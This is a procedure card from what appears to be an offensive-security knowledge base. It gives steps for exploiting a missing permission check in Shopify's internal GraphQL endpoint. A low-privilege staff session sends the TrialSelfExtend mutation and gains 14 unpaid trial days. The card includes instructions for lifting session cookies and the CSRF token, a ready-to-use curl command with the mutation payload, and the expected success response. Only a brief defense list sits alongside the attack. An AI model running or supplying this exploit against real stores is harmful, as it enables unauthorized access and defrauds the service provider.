---
id: proc-shopify-execute-trial-extend-mutation
tags:
  - graphql
  - mutation
  - access-bypass
  - shopify
type: procedure
tools: []
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/trial-self-extend-graphql]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Account Manipulation]]'
updated_at: '2025-12-14T17:30:26.784Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Default Accounts]]'
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Account Manipulation]]'
---
# Execute-TrialSelfExtend-GraphQL-Mutation

## Summary

This procedure exploits a lack of permission checks in Shopify's GraphQL API by sending the TrialSelfExtend mutation from a low-privilege staff session, extending the trial period without authorization and demonstrating improper access control.

## Description

The TrialSelfExtend mutation at /admin/internal/web/graphql/core is intended for admin use but lacks enforcement, allowing execution by 'report'-only staff. The attack uses the staff's session cookies and CSRF token in a POST request. Target: Shopify store on trial. Prerequisites: Staff session. Outcome: Successful extension, prolonging free access.

## Requirements

1. Staff session cookies and CSRF token (extract via browser dev tools)
2. Access to HTTP client like curl
3. Store domain (e.g., store.myshopify.com)

## Defense

Defensive measures and detection strategies:

- Add explicit permission checks in GraphQL resolvers for TrialSelfExtend
- Monitor GraphQL logs for unauthorized mutation executions
- Rate-limit or audit trial extension attempts

## Objectives

1. Bypass access controls on GraphQL endpoint
2. Extend trial by 14 days unpaid
3. Validate mutation success without errors

## Instructions

### Step 1: Prepare Session Data

**Context**: Extract necessary headers from staff browser session.

**Instructions**: In browser dev tools (F12), copy cookies and X-CSRF-Token from a logged-in request.

> Expected output: Valid cookie string and token.

### Step 2: Send Mutation Request

**Context**: Execute the GraphQL POST to trigger extension.

**Command** ([[commands/trial-self-extend-graphql]]):
```bash
curl -X POST https://store.myshopify.com/admin/internal/web/graphql/core \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: <csrf_token>" \
  -H "Cookie: <staff_session_cookies>" \
  -d '{"operationName":"TrialSelfExtend","variables":{},"query":"mutation TrialSelfExtend { trialSelfExtend { message userErrors { field message __typename } __typename } }"}'
```

> This sends the mutation payload. Expected output: {"data":{"trialSelfExtend":{"message":"14 days extension added to your trial period","userErrors":[]}}}.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Account Manipulation]] Account Manipulation

### Sub-Techniques

- [[Default Accounts]] Default Accounts

## Commands Used

- [[commands/trial-self-extend-graphql]]

## Tools Used


## Tags

- graphql
- trial-extend
- bypass
